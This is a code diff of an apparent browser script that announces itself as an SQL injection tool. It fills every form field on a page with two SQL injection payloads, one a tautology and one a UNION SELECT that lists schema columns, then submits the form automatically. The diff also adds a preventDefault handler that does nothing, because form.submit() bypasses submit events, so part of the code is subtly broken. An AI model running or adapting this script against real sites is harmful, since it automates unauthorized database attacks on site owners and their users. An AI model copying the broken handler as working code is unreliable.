@@ -2,13 +2,11 @@
   // Log to confirm the script is running
   console.log("SQL Injection script running...");
 
-  // SQL payloads to test
   const sqlPayloads = [
     "' OR 'a'='a",  // First payload
     "' UNION SELECT table_name, column_name FROM information_schema.columns --"  // Second payload
   ];
 
-  // Select the input fields and set values
   const formInputs = document.querySelectorAll('input, textarea');
   
   formInputs.forEach(input => {
@@ -19,13 +17,19 @@
     input.addEventListener('input', function() {
       const form = document.querySelector('form');
       if (form) {
-        console.log("Form found, submitting...");
-        form.submit();  // Submit the form after injection
+        console.log("Form found, preventing default submission...");
+        // Prevent default form submission (page reload)
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          console.log("Form submission prevented.");
+        }, { once: true });
+        
+        console.log("Form is being submitted...");
+        form.submit();  // Submit the form
       }
     });
   });
 
-  // Optionally, you can set a timeout to execute after a delay
   setTimeout(() => {
     const form = document.querySelector('form');
     if (form) {
